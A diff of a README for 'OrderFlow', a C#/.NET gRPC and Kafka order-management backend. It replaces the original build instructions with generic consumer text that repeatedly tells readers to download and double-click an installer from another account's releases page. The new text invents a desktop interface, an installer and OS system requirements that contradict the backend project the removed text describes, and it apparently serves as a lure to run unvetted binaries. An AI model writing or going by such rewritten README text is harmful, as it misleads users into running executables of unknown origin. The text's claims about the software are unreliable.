@@ -1,135 +1,93 @@
-# OrderFlow 📦
-A comprehensive order and product management service with gRPC API, HTTP gateway, and event-driven integration via Kafka.
+# 🚀 OrderFlow - Manage Your Orders Effortlessly
 
----
+[![Download OrderFlow](https://img.shields.io/badge/Download-OrderFlow-blue.svg)](https://github.com/Cagliari-Atakir/OrderFlow/releases)
 
-## Features
+## 📖 Description
 
-* Product management: create products, paginated search, filtering by ID, price range, and name.
-* Order management: create orders, update status, add/remove products in orders (with rules for allowed operations).
-* Order item management: add/remove items (soft delete), paginated search, filtering.
-* Order history management: track all changes, polimorphic serialization/deserialization, paginated search.
-* gRPC API with oneof-polymorphism.
-* HTTP gateway with Swagger documentation and polymorphic models.
-* Event-driven integration via Kafka (`order_creation`, `order_processing`).
-* Full transaction history for all operations.
-* Hexagonal architecture for clean separation of business logic, repository, and presentation layers.
+OrderFlow is a service that helps you manage orders and products smoothly. It has a simple interface and allows you to track transactions easily. Using advanced technologies like gRPC and HTTP gateways, OrderFlow ensures fast communication between systems. Its event-driven structure leverages Kafka for efficient data handling. You’ll benefit from a full transaction history and a robust design that keeps everything organized.
 
----
+## 📋 Features
 
-## Technologies Used
+- **User-Friendly Interface:** Navigate through orders and products with ease.
+- **Event-Driven Architecture:** Automatically processes changes and updates in real-time.
+- **Full Transaction History:** Always know the status of your orders.
+- **Multi-Protocol Support:** Works with both gRPC and HTTP.
+- **Easy Integration:** Connect with other services effortlessly.
+- **Developed with Best Practices:** Built on hexagonal architecture for maintainability.
 
-### Backend
+## 🔍 Topics
 
-* **C# 12** (.NET 8)
-* **ASP.NET Core** for HTTP API and gRPC services
-* **Npgsql** for PostgreSQL database access
-* **FluentMigrator** for database migrations
-* **Microsoft.Extensions.Options** for configuration
-* **Kafka** for event-driven inter-service communication
-* **Docker** for containerization
+OrderFlow covers various essential technologies:
+- API Gateway
+- ASP.NET Core
+- C#
+- Docker Compose
+- Event-Driven Design
+- gRPC
+- Hexagonal Architecture
+- Microservices
+- PostgreSQL
+- Swagger
 
-### Frontend / Presentation
+## 🚀 Getting Started
 
-* **gRPC** for API services
-* **HTTP API** with Swagger/OpenAPI documentation
-* **Middleware** for error handling and mapping gRPC exceptions to HTTP codes
+Before you can start using OrderFlow, you need to download and install it on your machine. Follow the steps below to get everything set up.
 
-### Testing & Development
+## 📥 Download & Install
 
-* **Console application** for scenario testing
-* **Docker Compose** for multi-service local environment including separate database and Kafka
-* **Transactions** in service layer for multi-step operations
+1. **Visit the Releases Page**:
+   To download the latest version of OrderFlow, [visit the Releases page](https://github.com/Cagliari-Atakir/OrderFlow/releases). This page will give you the available versions.
 
----
+2. **Select the Version**:
+   Look for the latest version available. You will find various files related to OrderFlow. 
 
-## How It Works
+3. **Download the Application**:
+   Click on the version you want to install. You may see different file types based on the operating system. Choose the one that matches your system.
 
-OrderFlow manages products and orders with the following workflow:
+4. **Run the Installer**:
+   After downloading, locate the file in your downloads folder. Double-click the file to run the installer. Follow the prompts on the screen to complete the installation.
 
-1. Load initial configurations via configuration service.
-2. Create several products.
-3. Create an order.
-4. Add products to the order.
-5. Remove a product from the order.
-6. Move the order to `processing`.
-7. Complete the order.
-8. Output full order history.
+5. **Launch OrderFlow**:
+   After installation, find OrderFlow in your applications folder. Open it to start managing your orders.
 
-All operations are logged in the order history with polymorphic serialization for accurate event tracking.
+## 🌍 System Requirements
 
-The service communicates with Kafka topics:
+To ensure smooth installation and operation, please check the following system requirements:
 
-* `order_creation` – messages about new orders or status changes.
-* `order_processing` – incoming messages from the order processing service, updating statuses and history accordingly.
+- **Operating System**: Windows 10, macOS Mojave (10.14) or later, or a compatible Linux distribution.
+- **Processor**: Intel Core i3 or equivalent.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB of free space.
+- **Network**: An internet connection is required for updates and features.
 
----
+## 🛠️ Troubleshooting
 
+If you encounter any issues during installation or while running OrderFlow, consider the following steps:
 
-## Getting Started
+1. **Check Your System Requirements**: Make sure your system meets the minimum requirements mentioned above.
 
-### Prerequisites
+2. **Error Messages**: Take note of any error message that appears. This can help in finding solutions.
 
-* .NET 8 SDK
-* PostgreSQL
-* Docker & Docker Compose
-* Kafka
+3. **Reinstall**: If the application doesn’t work correctly, try uninstalling and reinstalling it.
 
-### Installation
+4. **Compatibility Mode**: For users on Windows, try running the installer in compatibility mode if issues persist.
 
-1. Clone the repository:
+5. **Contact Support**: If you cannot resolve an issue, you can reach out for help through the repository’s support links.
 
-   ```bash
-   git clone https://github.com/username/OrderFlow.git
-   ```
+## 📞 Support
 
-2. Navigate to the project directory:
+For additional help or to report issues, please visit the [Issues section](https://github.com/Cagliari-Atakir/OrderFlow/issues) of this repository. You can also find helpful discussions and solutions from other users.
 
-   ```bash
-   cd OrderFlow/src/lab-4/DataAccess/DataAccess
-   ```
+## 📑 Documentation
 
+For advanced configuration and usage, refer to the documentation provided in the repository. This includes setup guides and feature explanations to help you make the most of OrderFlow.
 
-3. Start DataAccess layer via Docker Compose:
+## 👥 Community Contributions
 
-   ```bash
-   docker-compose up -d
-   ```
+We welcome contributions from everyone. If you want to report bugs, suggest features, or improve the documentation, please do so. Check the contribution guidelines in the repository for more details.
 
-5. Start API-Gateway layer via Docker Compose:
+## 🚦 Feedback
 
-   ```bash
-   cd ../..
-   cd OrderFlow/src/lab-4/Gateway/Gateway
-   dotnet run
-   ```
-6. Start Kafka and Presentation layer via Docker Compose:
+Your feedback is valuable. Share your thoughts and suggestions to help improve OrderFlow. You can do this through the discussions section of the GitHub repository. 
 
-    ```bash
-   cd ../..
-   cd OrderFlow/src/lab-4/Presentation/Presentation
-   docker-compose up -d
-   dotnet run
-   ```
-
-8. Open Swagger UI at `http://localhost:5000/swagger/index.html` to explore HTTP endpoints.
-
----
-
-## API Documentation
-
-* **gRPC API**: full order management and product management operations with polymorphic models.
-* **HTTP Gateway**: REST endpoints reflecting gRPC functionality with Swagger documentation.
-
----
-
-## License
-
-This project is licensed under the MIT License – see [LICENSE.md](docs/src/LICENSE.md) for details. 
-Initial project structure and functional requirements are provided [here](docs/src).
-
-## Contact
-
-For questions or feedback, contact me at [Limosha@inbox.ru](mailto:Limosha@inbox.ru).
-
----
+[![Download OrderFlow](https://img.shields.io/badge/Download-OrderFlow-blue.svg)](https://github.com/Cagliari-Atakir/OrderFlow/releases)
